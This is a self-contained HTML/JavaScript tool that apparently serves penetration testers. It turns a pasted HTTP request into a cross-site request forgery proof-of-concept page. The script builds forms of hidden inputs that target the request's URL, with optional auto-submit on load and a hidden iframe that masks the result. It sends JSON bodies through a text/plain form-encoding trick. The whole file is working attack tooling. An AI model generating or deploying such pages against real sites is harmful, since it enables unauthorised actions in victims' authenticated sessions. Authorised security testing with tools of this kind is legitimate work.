<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF PoC Generator</title>
    <style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#f5f5f5;color:#000;min-height:100vh;padding:24px}
.container{max-width:1200px;margin:0 auto}
header{margin-bottom:32px}
h1{font-size:2.5rem;font-weight:900;text-transform:uppercase;letter-spacing:-1px;border-bottom:4px solid #000;padding-bottom:8px;display:inline-block}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:24px}
@media(max-width:900px){.grid{grid-template-columns:1fr}}
.panel{background:#fff;border:3px solid #000;box-shadow:6px 6px 0 #000}
.panel-header{background:#000;color:#fff;padding:12px 16px;font-weight:700;text-transform:uppercase;font-size:.85rem;letter-spacing:1px;display:flex;justify-content:space-between;align-items:center}
.panel-body{padding:16px}
textarea{width:100%;min-height:320px;background:#fafafa;border:2px solid #000;font-family:'Courier New',monospace;font-size:12px;padding:12px;resize:vertical;line-height:1.5}
textarea:focus{outline:none;background:#fff}
.options{margin-top:16px;padding:12px;border:2px solid #000;background:#fafafa}
.options-title{font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:1px;margin-bottom:12px}
.options-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.option{display:flex;align-items:center;gap:8px;cursor:pointer}
.option input[type="checkbox"]{width:18px;height:18px;accent-color:#000;cursor:pointer}
.option label{font-size:.85rem;cursor:pointer;user-select:none}
.btn-row{display:flex;gap:8px;margin-top:16px}
.btn{flex:1;padding:14px 16px;border:3px solid #000;font-size:.85rem;font-weight:700;text-transform:uppercase;letter-spacing:.5px;cursor:pointer;transition:transform .1s,box-shadow .1s;box-shadow:4px 4px 0 #000}
.btn:active{transform:translate(2px,2px);box-shadow:2px 2px 0 #000}
.btn-primary{background:#000;color:#fff}
.btn-secondary{background:#fff;color:#000}
.btn-sm{padding:8px 12px;font-size:.75rem;box-shadow:3px 3px 0 #000}
.btn-sm:active{box-shadow:1px 1px 0 #000}
.output-actions{display:flex;gap:6px}
.status{margin-top:12px;padding:10px 12px;font-size:.85rem;font-weight:600;display:none;border:2px solid}
.status.success{display:block;background:#d4ffd4;border-color:#000}
.status.error{display:block;background:#ffd4d4;border-color:#000}
.parsed{margin-top:12px;padding:12px;border:2px solid #000;background:#fafafa;display:none;font-size:.8rem}
.parsed.show{display:block}
.parsed-row{display:flex;margin-bottom:4px}
.parsed-label{font-weight:700;min-width:100px;text-transform:uppercase;font-size:.7rem}
.parsed-value{word-break:break-all;font-family:'Courier New',monospace}
.tag{display:inline-block;padding:2px 8px;font-size:.7rem;font-weight:700;text-transform:uppercase;border:2px solid #000}
.tag-json{background:#fff3cd}
.tag-form{background:#d4ffd4}
.tag-multipart{background:#cce5ff}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>CSRF PoC Generator</h1>
        </header>
        <div class="grid">
            <div class="panel">
                <div class="panel-header"><span>HTTP Request</span></div>
                <div class="panel-body">
                    <textarea id="httpRequest" placeholder="Paste raw HTTP request here..."></textarea>
                    <div class="parsed" id="parsedInfo">
                        <div class="parsed-row">
                            <span class="parsed-label">Method:</span>
                            <span class="parsed-value" id="parsedMethod">-</span>
                        </div>
                        <div class="parsed-row">
                            <span class="parsed-label">URL:</span>
                            <span class="parsed-value" id="parsedUrl">-</span>
                        </div>
                        <div class="parsed-row">
                            <span class="parsed-label">Technique:</span>
                            <span class="parsed-value" id="parsedTechnique">-</span>
                        </div>
                    </div>
                    <div class="options">
                        <div class="options-title">Options</div>
                        <div class="options-grid">
                            <div class="option">
                                <input type="checkbox" id="autoSubmit">
                                <label for="autoSubmit">Auto-submit</label>
                            </div>
                            <div class="option">
                                <input type="checkbox" id="includeButton" checked>
                                <label for="includeButton">Submit button</label>
                            </div>
                            <div class="option">
                                <input type="checkbox" id="useIframe">
                                <label for="useIframe">Hidden iframe</label>
                            </div>
                        </div>
                    </div>
                    <div class="btn-row">
                        <button class="btn btn-primary" id="btnGenerate">Generate</button>
                        <button class="btn btn-secondary" id="btnClear">Clear</button>
                    </div>
                    <div class="status" id="statusBar"></div>
                </div>
            </div>
            <div class="panel">
                <div class="panel-header">
                    <span>Generated PoC</span>
                    <div class="output-actions">
                        <button class="btn btn-secondary btn-sm" id="btnCopy">Copy</button>
                        <button class="btn btn-secondary btn-sm" id="btnDownload">Download</button>
                        <button class="btn btn-primary btn-sm" id="btnTest">Test</button>
                    </div>
                </div>
                <div class="panel-body">
                    <textarea id="pocOutput" readonly placeholder="Generated HTML will appear here..."></textarea>
                </div>
            </div>
        </div>
    </div>
<script type="text/javascript">
(function(){
var ALLOWED_METHODS=['GET','POST','PUT','DELETE','PATCH'];
var MAX_INPUT_LENGTH=1000000;

function encodeHtml(s){
if(typeof s!=='string')return'';
return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;').replace(/\//g,'&#x2F;').replace(/`/g,'&#x60;').replace(/=/g,'&#x3D;');
}

function encodeJson(s){
if(typeof s!=='string')return'';
var r='',m={'{':"&#123;",'}':"&#125;",'"':'&quot;',':':"&#58;",'.':"&#46;",'-':"&#45;",'_':"&#95;",'/':"&#47;",'=':"&#61;",'+':"&#43;",'&':'&amp;','<':'&lt;','>':'&gt;',"'":"&#39;"};
for(var i=0;i<s.length;i++){var c=s[i];if(m[c])r+=m[c];else{var code=c.charCodeAt(0);if(code>127||code<32)r+='&#'+code+';';else r+=c;}}
return r;
}

function isValidUrl(s){try{var u=new URL(s);return u.protocol==='http:'||u.protocol==='https:';}catch(e){return false;}}

function parseRequest(raw){
if(typeof raw!=='string')throw new Error('Invalid input');
if(raw.length>MAX_INPUT_LENGTH)throw new Error('Input too large');
var lines=raw.trim().split('\n').map(function(l){return l.replace(/\r$/,'');});
if(lines.length===0)throw new Error('Empty request');
var m=lines[0].match(/^(GET|POST|PUT|DELETE|PATCH|OPTIONS|HEAD)\s+(\S+)/i);
if(!m)throw new Error('Invalid request line');
var method=m[1].toUpperCase();
if(ALLOWED_METHODS.indexOf(method)===-1)throw new Error('Invalid method');
var path=m[2],headers={},bodyStart=-1,host='';
for(var i=1;i<lines.length;i++){
if(lines[i].trim()===''){bodyStart=i+1;break;}
var hm=lines[i].match(/^([^:]+):\s*(.*)$/);
if(hm){var n=hm[1].toLowerCase().trim(),v=hm[2].trim();if(n.length>0&&n.length<256){headers[n]=v;if(n==='host')host=v;}}}
var body='';if(bodyStart>0&&bodyStart<lines.length)body=lines.slice(bodyStart).join('\n');
var url;
if(path.indexOf('http://')===0||path.indexOf('https://')===0)url=path;
else{if(!host)throw new Error('Missing Host header');url='https://'+host.replace(/[<>"'`]/g,'')+path;}
if(!isValidUrl(url))throw new Error('Invalid URL');
return{method:method,url:url,headers:headers,body:body,contentType:headers['content-type']||''};}

function detectTech(ct,body){
var c=ct.toLowerCase();
if(c.indexOf('application/json')!==-1)return'json';
if(c.indexOf('multipart/form-data')!==-1)return'multipart';
if(c.indexOf('application/x-www-form-urlencoded')!==-1)return'form';
if(body){try{JSON.parse(body);return'json';}catch(e){}}
return'form';}

function parseForm(body){
if(!body||typeof body!=='string')return[];
var params=[],pairs=body.split('&');
for(var i=0;i<pairs.length;i++){var p=pairs[i],idx=p.indexOf('=');
if(idx>0)params.push({name:decodeURIComponent(p.substring(0,idx)),value:decodeURIComponent(p.substring(idx+1))});
else if(p.length>0)params.push({name:decodeURIComponent(p),value:''});}
return params;}

function genTemplate(req,enc,inputs,opts){
var ifr=opts.useIframe?'<iframe name="f" style="display:none"><\/iframe>\n    ':'';
var tgt=opts.useIframe?' target="f"':'';
var scr='';
if(opts.autoSubmit)scr='document.forms[0].submit();';
else if(opts.includeButton)scr="var b=document.createElement('button');b.textContent='Submit';b.onclick=function(){document.forms[0].submit();};document.body.appendChild(b);";
return'<html>\n  <body>\n    '+ifr+'<form action="'+encodeHtml(req.url)+'" method="'+req.method+'"'+(enc?' enctype="'+enc+'"':'')+tgt+'>\n'+inputs+'\n    <\/form>\n    <scr'+'ipt>\n      '+scr+'\n    <\/scr'+'ipt>\n  <\/body>\n<\/html>';}

function genForm(req,opts){
var params=parseForm(req.body);
var inputs=params.map(function(p){return'      <input type="hidden" name="'+encodeHtml(p.name)+'" value="'+encodeHtml(p.value)+'">';}).join('\n');
return genTemplate(req,'application/x-www-form-urlencoded',inputs,opts);}

function genJson(req,opts){
var inputs='      <input type="hidden" name="'+encodeJson(req.body)+'" value="">';
return genTemplate(req,'text/plain',inputs,opts);}

function genMulti(req,opts){
var params=parseForm(req.body);
var inputs=params.map(function(p){return'      <input type="hidden" name="'+encodeHtml(p.name)+'" value="'+encodeHtml(p.value)+'">';}).join('\n');
return genTemplate(req,'multipart/form-data',inputs,opts);}

function showStatus(msg,type){
var el=document.getElementById('statusBar');
el.textContent=msg;
el.className='status '+type;}

function updateInfo(req,tech){
var el=document.getElementById('parsedInfo');
el.classList.add('show');
document.getElementById('parsedMethod').textContent=req.method;
document.getElementById('parsedUrl').textContent=req.url;
var te=document.getElementById('parsedTechnique');
te.innerHTML='';
var tag=document.createElement('span');
tag.className='tag tag-'+tech;
tag.textContent=tech.toUpperCase();
te.appendChild(tag);}

function generate(){
var raw=document.getElementById('httpRequest').value;
if(!raw.trim()){showStatus('Please paste a valid HTTP request','error');return;}
try{
var req=parseRequest(raw);
var tech=detectTech(req.contentType,req.body);
var opts={autoSubmit:document.getElementById('autoSubmit').checked,includeButton:document.getElementById('includeButton').checked,useIframe:document.getElementById('useIframe').checked};
var poc;
if(tech==='json')poc=genJson(req,opts);
else if(tech==='multipart')poc=genMulti(req,opts);
else poc=genForm(req,opts);
document.getElementById('pocOutput').value=poc;
updateInfo(req,tech);
showStatus('PoC generated successfully','success');
}catch(err){showStatus('Error: '+err.message,'error');}}

function copy(){
var o=document.getElementById('pocOutput');
if(!o.value){showStatus('Nothing to copy','error');return;}
navigator.clipboard.writeText(o.value).then(function(){showStatus('Copied','success');}).catch(function(){o.select();document.execCommand('copy');showStatus('Copied','success');});}

function download(){
var o=document.getElementById('pocOutput').value;
if(!o){showStatus('Nothing to download','error');return;}
var b=new Blob([o],{type:'text/html;charset=utf-8'});
var u=URL.createObjectURL(b);
var a=document.createElement('a');
a.href=u;a.download='csrf_poc.html';a.click();
URL.revokeObjectURL(u);
showStatus('Downloaded','success');}

function test(){
var o=document.getElementById('pocOutput').value;
if(!o){showStatus('Nothing to test','error');return;}
var b=new Blob([o],{type:'text/html'});
var u=URL.createObjectURL(b);
window.open(u,'_blank');
showStatus('Opened in new tab','success');}

function clear(){
document.getElementById('httpRequest').value='';
document.getElementById('pocOutput').value='';
document.getElementById('parsedInfo').classList.remove('show');
document.getElementById('statusBar').className='status';}

document.getElementById('btnGenerate').addEventListener('click',generate);
document.getElementById('btnClear').addEventListener('click',clear);
document.getElementById('btnCopy').addEventListener('click',copy);
document.getElementById('btnDownload').addEventListener('click',download);
document.getElementById('btnTest').addEventListener('click',test);
document.getElementById('httpRequest').addEventListener('input',function(){
if(this.value.trim()){try{var r=parseRequest(this.value);var t=detectTech(r.contentType,r.body);updateInfo(r,t);}catch(e){document.getElementById('parsedInfo').classList.remove('show');}}
else{document.getElementById('parsedInfo').classList.remove('show');}});
})();
</script>
</body>
</html>
